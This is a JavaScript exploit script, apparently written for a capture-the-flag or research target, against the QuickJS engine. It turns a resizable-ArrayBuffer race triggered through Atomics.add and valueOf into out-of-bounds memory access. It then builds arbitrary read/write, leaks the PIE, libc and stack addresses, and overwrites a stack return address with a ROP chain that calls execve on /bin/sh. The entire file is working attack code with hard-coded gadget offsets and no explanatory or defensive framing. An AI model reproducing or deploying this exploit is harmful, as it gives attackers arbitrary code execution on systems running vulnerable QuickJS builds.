// QuickJS CFI Bypass Exploit - v2
// Try targeting a different return address

const POP_RDI_RET = 0x2a145n;
const POP_RSI_RET = 0x2baa9n;
const POP_RDX_RBX_RET = 0x8f0c5n;
const BIN_SH = 0x1a7ea4n;
const EXECVE = 0xdddd0n;
const ENVIRON = 0x1eee28n;
const PUTS = 0x805a0n;

const JS_ARRAY_BUFFER_FREE_CFI = 0x107df0n;
const PUTS_GOT = 0x1117a0n;

// Stage 1: Trigger vulnerability
let ab = new ArrayBuffer(56, { maxByteLength: 4096 });
let int32Array = new Int32Array(ab);

let victimBuffers = [];
let victimArrays = [];

let malicious = {
    valueOf: function() {
        ab.resize(4096);
        for (let i = 0; i < 100; i++) {
            let buf = new ArrayBuffer(32);
            let arr = new Uint8Array(buf);
            arr[0] = 0xAA;
            arr[1] = i;
            victimBuffers.push(buf);
            victimArrays.push(arr);
        }
        return 0x10000 - 0x20;
    }
};

Atomics.add(int32Array, 0, malicious);

let oobArray = null;
let oobIdx = -1;
for (let i = 0; i < victimBuffers.length; i++) {
    if (victimBuffers[i].byteLength !== 32) {
        oobArray = new Uint8Array(victimBuffers[i]);
        oobIdx = i;
        break;
    }
}

if (!oobArray) throw new Error("");

function oobReadU64(offset) {
    let val = 0n;
    for (let i = 7; i >= 0; i--) {
        val = (val << 8n) | BigInt(oobArray[offset + i]);
    }
    return val;
}

function oobWriteU64(offset, val) {
    let big = BigInt(val);
    for (let i = 0; i < 8; i++) {
        oobArray[offset + i] = Number(big & 0xFFn);
        big >>= 8n;
    }
}

function oobReadU32(offset) {
    return (oobArray[offset] |
           (oobArray[offset + 1] << 8) |
           (oobArray[offset + 2] << 16) |
           (oobArray[offset + 3] << 24)) >>> 0;
}

// Stage 2: Find PIE base
let pieBase = 0n;
for (let off = 0; off < 60000; off += 4) {
    let bl = oobReadU32(off);
    let mbl = oobReadU32(off + 4);
    if (bl === 32 && mbl === 0xFFFFFFFF) {
        let freeFunc = oobReadU64(off + 48);
        if (freeFunc > 0x500000000000n) {
            pieBase = freeFunc - JS_ARRAY_BUFFER_FREE_CFI;
            break;
        }
    }
}

if (pieBase === 0n) throw new Error("");

// Stage 3: Find JSObject for arb R/W
let arbObjOffset = -1;
let arbArrayIdx = -1;
let arbOrigDataPtr = 0n;
let putsGotAddr = pieBase + PUTS_GOT;

for (let off = 0; off < 60000; off += 8) {
    let count = oobReadU32(off + 48);
    if (count !== 32) continue;

    let dataPtr = oobReadU64(off + 40);
    if (dataPtr < 0x500000000000n || dataPtr > 0x600000000000n) continue;

    let shape = oobReadU64(off + 16);
    if (shape < 0x500000000000n || shape > 0x600000000000n) continue;

    let origDataPtr = dataPtr;
    oobWriteU64(off + 40, putsGotAddr);

    for (let i = 0; i < victimArrays.length; i++) {
        if (i === oobIdx) continue;
        let val = 0n;
        for (let j = 7; j >= 0; j--) {
            val = (val << 8n) | BigInt(victimArrays[i][j]);
        }
        if (val > 0x7f0000000000n && val < 0x800000000000n) {
            arbObjOffset = off;
            arbArrayIdx = i;
            arbOrigDataPtr = origDataPtr;
            break;
        }
    }

    oobWriteU64(off + 40, origDataPtr);
    if (arbObjOffset >= 0) break;
}

if (arbObjOffset < 0) throw new Error("");

function arbRead64(addr) {
    oobWriteU64(arbObjOffset + 40, addr);
    let arr = victimArrays[arbArrayIdx];
    let val = 0n;
    for (let j = 7; j >= 0; j--) {
        val = (val << 8n) | BigInt(arr[j]);
    }
    return val;
}

function arbWrite64(addr, val) {
    oobWriteU64(arbObjOffset + 40, addr);
    let arr = victimArrays[arbArrayIdx];
    let big = BigInt(val);
    for (let i = 0; i < 8; i++) {
        arr[i] = Number(big & 0xFFn);
        big >>= 8n;
    }
}

function restore() {
    oobWriteU64(arbObjOffset + 40, arbOrigDataPtr);
}

// Stage 4: Leak libc
let putsLibc = arbRead64(putsGotAddr);
let libcBase = putsLibc - PUTS;

// Stage 5: Leak stack
let environAddr = libcBase + ENVIRON;
let stackLeak = arbRead64(environAddr);

// Stage 6: Find return addresses - collect multiple
let retAddrs = [];
for (let offset = 0n; offset < 0x3000n; offset += 8n) {
    let addr = stackLeak - offset;
    let val = arbRead64(addr);
    if (val > pieBase && val < pieBase + 0x200000n) {
        retAddrs.push({addr: addr, val: val, offset: offset});
    }
}

if (retAddrs.length === 0) {
    restore();
    throw new Error("");
}

// Try to find a return address that's deeper in the stack (further from environ)
// Skip the first few which might be in unwinding code
let targetIdx = Math.min(10, retAddrs.length - 1);
let retAddrLoc = retAddrs[targetIdx].addr;

// Stage 7: Write ROP chain
let ropChain = [
    libcBase + POP_RDI_RET,
    libcBase + BIN_SH,
    libcBase + POP_RSI_RET,
    0n,
    libcBase + POP_RDX_RBX_RET,
    0n,
    0n,
    libcBase + EXECVE
];

for (let i = 0; i < ropChain.length; i++) {
    let addr = retAddrLoc + BigInt(i * 8);
    arbWrite64(addr, ropChain[i]);
}

restore();
